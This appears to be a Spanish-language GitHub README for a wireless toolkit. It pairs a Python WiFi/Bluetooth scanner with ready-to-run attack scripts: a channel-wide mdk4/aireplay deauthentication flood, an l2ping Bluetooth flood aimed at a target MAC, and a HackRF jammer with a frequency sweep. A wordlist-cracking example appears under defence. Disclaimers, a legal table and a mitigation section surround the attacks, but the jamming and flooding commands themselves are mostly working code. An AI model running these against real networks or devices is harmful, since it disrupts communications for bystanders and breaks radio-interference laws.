<div align="center">

```
 ██╗    ██╗██╗███████╗██╗    ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗  ██╗
 ██║    ██║██║██╔════╝██║    ██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗ ██║
 ██║ █╗ ██║██║█████╗  ██║    ██████╔╝   ██║       ███████╗██║     ███████║██╔██╗██║
 ██║███╗██║██║██╔══╝  ██║    ██╔══██╗   ██║       ╚════██║██║     ██╔══██║██║╚████║
 ╚███╔███╔╝██║██║     ██║    ██║  ██║   ██║       ███████║╚██████╗██║  ██║██║ ╚███║
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝
```

# WiFi & Bluetooth Security Toolkit

**Detección de vulnerabilidades inalámbricas · Análisis de señales · Bloqueo de frecuencias RFI/BT/WiFi**

[![Python](https://img.shields.io/badge/Python-3.8+-3776ab?style=flat-square&logo=python&logoColor=white)]()
[![Scapy](https://img.shields.io/badge/Scapy-2.5+-ff3c3c?style=flat-square)]()
[![Bash](https://img.shields.io/badge/Bash-5.x-4eaa25?style=flat-square&logo=gnubash)]()
[![Platform](https://img.shields.io/badge/Platform-Linux-4a4a4a?style=flat-square&logo=linux)]()
[![Warning](https://img.shields.io/badge/⚠️-Solo%20uso%20autorizado-ff8c00?style=flat-square)]()

> ⚠️ **Este toolkit es exclusivamente para auditorías de seguridad autorizadas, laboratorios y entornos CTF. El escaneo de redes sin permiso y el uso de inhibidores de señal son ilegales en la mayoría de jurisdicciones.**

</div>

---

## Índice

- [Módulo 1: Scanner de Vulnerabilidades WiFi + Bluetooth](#-módulo-1-scanner-de-vulnerabilidades-wifi--bluetooth)
- [Módulo 2: Bloqueo de señales RFI, BT y WiFi](#-módulo-2-bloqueo-de-señales-rfi-bt-y-wifi)
- [Setup del entorno](#-setup-del-entorno)
- [Comprensión técnica de las frecuencias](#-comprensión-técnica-de-las-frecuencias)
- [Mitigación y defensa](#%EF%B8%8F-mitigación-y-defensa)
- [Marco legal](#%EF%B8%8F-marco-legal)

---

## 📡 Módulo 1: Scanner de Vulnerabilidades WiFi + Bluetooth

### ¿Qué detecta?

```
WiFi
├── SSID y BSSID de redes cercanas
├── Tipo de cifrado (WEP, WPA, WPA2, WPA3, OPEN)
├── Redes abiertas sin autenticación
├── Redes ocultas (hidden SSID)
└── Canal y potencia de señal (dBm)

Bluetooth
├── Dispositivos visibles en rango
├── Dirección MAC BT
├── Nombre del dispositivo
├── Clase del dispositivo (teléfono, laptop, auricular...)
└── Detecta modo "discoverable" innecesario
```

### Script Python completo

```python
#!/usr/bin/env python3
"""
WiFi + Bluetooth Vulnerability Scanner
Requiere: pip install scapy pybluez tabulate
Requiere: adaptador WiFi en modo monitor (airmon-ng start wlan0)
Ejecutar como root: sudo python3 wifi_bt_scanner.py
"""

import sys
import time
import threading
import collections
from datetime import datetime

try:
    from scapy.all import *
    from tabulate import tabulate
except ImportError:
    print("Instala dependencias: pip install scapy tabulate")
    sys.exit(1)

# ── Almacenamiento de resultados ─────────────────────────────────────────────
redes_wifi    = {}   # {bssid: {ssid, crypto, canal, potencia, timestamp}}
errores_wifi  = []   # redes con configuración débil

def clasificar_seguridad(crypto_set):
    """Evalúa el nivel de seguridad del cifrado detectado."""
    if not crypto_set or 'OPN' in crypto_set:
        return "🔴 ABIERTA (sin cifrado)"
    if 'WEP' in crypto_set:
        return "🔴 WEP (roto, vulnerable)"
    if 'WPA' in crypto_set and 'WPA2' not in crypto_set:
        return "🟡 WPA (mejorable)"
    if 'WPA2' in crypto_set and 'WPA3' not in crypto_set:
        return "🟢 WPA2"
    if 'WPA3' in crypto_set:
        return "🟢 WPA3 (robusto)"
    return "❓ Desconocido"

def callback_wifi(pkt):
    """Callback para cada paquete capturado en modo monitor."""
    if not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeResp):
        return

    bssid = pkt.addr2
    if not bssid:
        return

    try:
        ssid = pkt.info.decode('utf-8', errors='replace') if pkt.info else "<Oculta>"
    except:
        ssid = "<Error de decodificación>"

    ssid = ssid if ssid.strip() else "<Red Oculta>"

    try:
        stats  = pkt.getlayer(Dot11Beacon).network_stats()
        crypto = stats.get('crypto', set())
        canal  = stats.get('channel', '?')
    except:
        crypto = set()
        canal  = '?'

    # Potencia de señal (dBm)
    potencia = getattr(pkt, 'dBm_AntSignal', '?')

    seguridad = clasificar_seguridad(crypto)

    redes_wifi[bssid] = {
        'ssid':      ssid,
        'crypto':    ', '.join(crypto) if crypto else 'OPEN',
        'seguridad': seguridad,
        'canal':     canal,
        'potencia':  f"{potencia} dBm",
        'visto':     datetime.now().strftime('%H:%M:%S')
    }

    # Marcar como vulnerable si es red abierta o WEP
    if 'OPN' in str(crypto) or 'WEP' in str(crypto):
        if bssid not in [e['bssid'] for e in errores_wifi]:
            errores_wifi.append({'bssid': bssid, 'ssid': ssid, 'problema': seguridad})

def scan_wifi(interfaz="wlan0mon", duracion=20):
    """Inicia el escaneo WiFi en modo monitor."""
    print(f"\n[*] Iniciando escaneo WiFi en {interfaz} por {duracion}s...")
    print("[*] Presiona Ctrl+C para detener antes\n")
    try:
        sniff(iface=interfaz, prn=callback_wifi, timeout=duracion, store=False)
    except PermissionError:
        print("❌ Se requieren permisos de root: sudo python3 scanner.py")
    except OSError as e:
        print(f"❌ Interfaz no disponible: {e}")
        print("   Activa modo monitor: sudo airmon-ng start wlan0")

def scan_bluetooth(duracion=10):
    """Escanea dispositivos Bluetooth en rango."""
    try:
        import bluetooth
    except ImportError:
        print("❌ PyBluez no instalado: pip install pybluez")
        return []

    print(f"\n[*] Escaneando Bluetooth por {duracion}s...")
    dispositivos = bluetooth.discover_devices(
        duration=duracion,
        lookup_names=True,
        lookup_class=True
    )

    resultados = []
    for addr, nombre, clase in dispositivos:
        # La clase del dispositivo indica el tipo (teléfono, PC, auricular...)
        tipo = interpretar_clase_bt(clase)
        resultados.append({
            'mac':    addr,
            'nombre': nombre or "<Sin nombre>",
            'tipo':   tipo,
            'riesgo': "🟡 Discoverable" if clase else "❓"
        })

    return resultados

def interpretar_clase_bt(clase):
    """Interpreta la clase de dispositivo Bluetooth."""
    major = (clase >> 8) & 0x1F
    tipos = {
        0: "Misceláneo", 1: "Computadora", 2: "Teléfono",
        3: "Access Point", 4: "Audio/Video", 5: "Periférico",
        6: "Imagen", 7: "Wearable", 8: "Juguete"
    }
    return tipos.get(major, f"Clase {major}")

def mostrar_resultados_wifi():
    """Muestra tabla de redes WiFi detectadas."""
    if not redes_wifi:
        print("\n[!] No se detectaron redes WiFi")
        return

    print(f"\n{'═'*70}")
    print(f"  REDES WiFi DETECTADAS ({len(redes_wifi)} total)")
    print(f"{'═'*70}")

    filas = [
        [
            datos['ssid'][:30],
            bssid,
            datos['canal'],
            datos['potencia'],
            datos['seguridad']
        ]
        for bssid, datos in redes_wifi.items()
    ]

    print(tabulate(
        filas,
        headers=["SSID", "BSSID", "Canal", "Señal", "Seguridad"],
        tablefmt="rounded_grid"
    ))

    if errores_wifi:
        print(f"\n{'═'*70}")
        print(f"  ⚠️  VULNERABILIDADES DETECTADAS ({len(errores_wifi)})")
        print(f"{'═'*70}")
        filas_err = [[e['ssid'], e['bssid'], e['problema']] for e in errores_wifi]
        print(tabulate(filas_err, headers=["Red", "BSSID", "Problema"], tablefmt="rounded_grid"))

def mostrar_resultados_bt(dispositivos):
    """Muestra tabla de dispositivos Bluetooth."""
    if not dispositivos:
        print("\n[!] No se detectaron dispositivos Bluetooth")
        return

    print(f"\n{'═'*60}")
    print(f"  DISPOSITIVOS BLUETOOTH ({len(dispositivos)} detectados)")
    print(f"{'═'*60}")

    filas = [[d['nombre'], d['mac'], d['tipo'], d['riesgo']] for d in dispositivos]
    print(tabulate(filas, headers=["Nombre", "MAC", "Tipo", "Estado"], tablefmt="rounded_grid"))

# ── Punto de entrada ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    IFACE   = sys.argv[1] if len(sys.argv) > 1 else "wlan0mon"
    TIMEOUT = int(sys.argv[2]) if len(sys.argv) > 2 else 20

    print("┌─────────────────────────────────────────────────┐")
    print("│  WiFi + Bluetooth Vulnerability Scanner          │")
    print("│  Solo para uso autorizado y entornos de lab     │")
    print("└─────────────────────────────────────────────────┘")

    # Escaneo paralelo WiFi + BT
    thread_bt = threading.Thread(target=lambda: mostrar_resultados_bt(scan_bluetooth(10)))
    thread_bt.start()

    scan_wifi(IFACE, TIMEOUT)
    thread_bt.join()

    mostrar_resultados_wifi()
```

### Uso

```bash
# 1. Activar modo monitor
sudo airmon-ng start wlan0
# → crea interfaz wlan0mon

# 2. Ejecutar scanner
sudo python3 wifi_bt_scanner.py wlan0mon 30

# Salida:
# ══════════════════════════════════════════════════════════════════════
#   REDES WiFi DETECTADAS (12 total)
# ══════════════════════════════════════════════════════════════════════
# ╭────────────┬───────────────────┬───────┬──────────┬────────────────────────╮
# │ SSID       │ BSSID             │ Canal │ Señal    │ Seguridad              │
# ├────────────┼───────────────────┼───────┼──────────┼────────────────────────┤
# │ MiRed-5G   │ A4:C3:F0:85:AC:B5 │ 36    │ -45 dBm  │ 🟢 WPA2                │
# │ Red_Vecino │ 00:1A:2B:3C:4D:5E │ 6     │ -72 dBm  │ 🔴 ABIERTA (sin cifrad)│
# │ <Oculta>   │ B8:27:EB:AA:BB:CC │ 11    │ -68 dBm  │ 🟢 WPA3 (robusto)      │
# ╰────────────┴───────────────────┴───────┴──────────┴────────────────────────╯
```

---

## 📶 Módulo 2: Bloqueo de Señales RFI, BT y WiFi

> ⚠️ **El uso de inhibidores o jammers de señal es ilegal en la mayoría de países sin licencias específicas (operadores de telecomunicaciones, fuerzas de seguridad, entornos militares). Esta sección es estrictamente educativa.**

### A. Deautenticación WiFi (Bash + mdk4)

Interrumpe conexiones en un canal enviando paquetes de deauth masivos.

```bash
#!/bin/bash
# Requiere: mdk4 (sudo apt install mdk4)
# Requiere: interfaz en modo monitor

IFACE="wlan0mon"
TARGET_BSSID=""   # Dejar vacío = afecta todo el canal
CANAL=6

echo "[*] Activando modo monitor..."
sudo airmon-ng start wlan0

echo "[*] Iniciando deautenticación en canal $CANAL..."
# Modo d = deauthentication flood
# -c = canal específico
sudo mdk4 $IFACE d -c $CANAL ${TARGET_BSSID:+-b $TARGET_BSSID}

# Alternativa con aireplay-ng (más selectivo):
# sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $IFACE
```

### B. Saturación Bluetooth (Bash)

```bash
#!/bin/bash
# Requiere: bluez-utils (sudo apt install bluez)
# Objetivo: dirección MAC del dispositivo BT

TARGET_MAC="AA:BB:CC:DD:EE:FF"  # Cambiar por MAC objetivo

echo "[*] Iniciando ping flood Bluetooth a $TARGET_MAC..."
# -f = flood (envío continuo)
# -s = tamaño del paquete
sudo l2ping -f -s 600 $TARGET_MAC

# Para saturar múltiples dispositivos simultáneamente:
# for mac in "AA:BB:CC:DD:EE:FF" "11:22:33:44:55:66"; do
#   sudo l2ping -f $mac &
# done
```

### C. Bloqueo de frecuencias RFI (HackRF/SDR)

Requiere hardware SDR como HackRF One, RTL-SDR o USRP.

```bash
#!/bin/bash
# Requiere: hackrf_transfer (sudo apt install hackrf)
# ⚠️ Solo para laboratorio RF aislado (jaula de Faraday)

# Frecuencias comunes:
# 2.412 GHz = WiFi Canal 1
# 2.437 GHz = WiFi Canal 6 (más común)
# 2.462 GHz = WiFi Canal 11
# 2.402 GHz = Bluetooth (hop espectral 2.402-2.480 GHz)

FREQ_HZ=2437000000    # 2.437 GHz (WiFi Canal 6 / BT overlap)
SAMPLE_RATE=20000000  # 20 MSps
GAIN=47               # dB (máximo HackRF)

echo "[*] Emitiendo ruido en $((FREQ_HZ/1000000)) MHz..."
echo "    Presiona Ctrl+C para detener"

# /dev/zero = ruido blanco (señal nula que ocupa el canal)
sudo hackrf_transfer \
  -t /dev/zero \
  -f $FREQ_HZ \
  -s $SAMPLE_RATE \
  -a 1 \
  -x $GAIN

# Para barrer un rango de frecuencias (más agresivo):
# for freq in 2412 2417 2422 2427 2432 2437 2442 2447 2452 2457 2462; do
#   hackrf_transfer -t /dev/zero -f ${freq}000000 -s 20000000 -a 1 -x 47 &
#   sleep 0.5
# done
```

---

## 🔧 Setup del Entorno

```bash
# Dependencias Python
pip install scapy pybluez tabulate

# Herramientas de sistema (Linux)
sudo apt update
sudo apt install -y aircrack-ng mdk4 bluez bluez-tools hackrf

# Activar modo monitor
sudo airmon-ng check kill       # Matar procesos conflictivos
sudo airmon-ng start wlan0      # Activar modo monitor
iwconfig                        # Verificar wlan0mon activa
```

---

## 🔬 Comprensión Técnica de las Frecuencias

```
2.4 GHz Band (WiFi 802.11b/g/n + Bluetooth)
├── Canal 1:  2.412 GHz  ──┐
├── Canal 6:  2.437 GHz  ──┼── Bluetooth opera aquí (2.402-2.480 GHz)
└── Canal 11: 2.462 GHz  ──┘

5 GHz Band (WiFi 802.11a/ac/ax)
├── Canales 36-64:  5.180-5.320 GHz
└── Canales 100-165: 5.500-5.825 GHz

Bluetooth (FHSS - Frequency Hopping)
└── Salta entre 79 canales en 2.402-2.480 GHz cada 625μs
    → Por eso necesita flood continuo para saturarlo
```

---

## 🛡️ Mitigación y Defensa

### Para redes WiFi

```bash
# Auditar tu red con aircrack
airodump-ng wlan0mon --bssid TU_BSSID -c TU_CANAL -w captura
aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt
```

| Acción defensiva | Impacto |
|---|---|
| Usar WPA3 o WPA2-AES | Elimina ataques de diccionario simples |
| Deshabilitar WPS | Cierra vector de ataque por PIN |
| MAC filtering | Dificulta (no impide) accesos no autorizados |
| Red de invitados separada | Aísla dispositivos IoT |
| Monitoreo con IDS (Snort/Suricata) | Detecta ataques de deauth |

### Para Bluetooth

```bash
# Deshabilitar Bluetooth cuando no se usa
sudo systemctl stop bluetooth
sudo rfkill block bluetooth

# Verificar dispositivos conectados
bluetoothctl devices
bluetoothctl info AA:BB:CC:DD:EE:FF
```

---

## ⚖️ Marco Legal

| Acción | Estado legal |
|---|---|
| Escanear tu propia red | ✅ Legal |
| Escanear con autorización escrita | ✅ Legal (pentesting) |
| Escanear redes de terceros | ❌ Ilegal (acceso no autorizado) |
| Deauth en tu red propia (lab) | ⚠️ Gris (depende del país) |
| Jammers/inhibidores en público | ❌ Ilegal (interfiere servicios) |
| SDR en jaula de Faraday | ✅ Legal (señal contenida) |

---

<div align="center">

**Para uso en laboratorio, auditorías autorizadas y entornos CTF únicamente.**

`sudo airmon-ng start wlan0 → modo monitor → hackea con permiso`

</div>
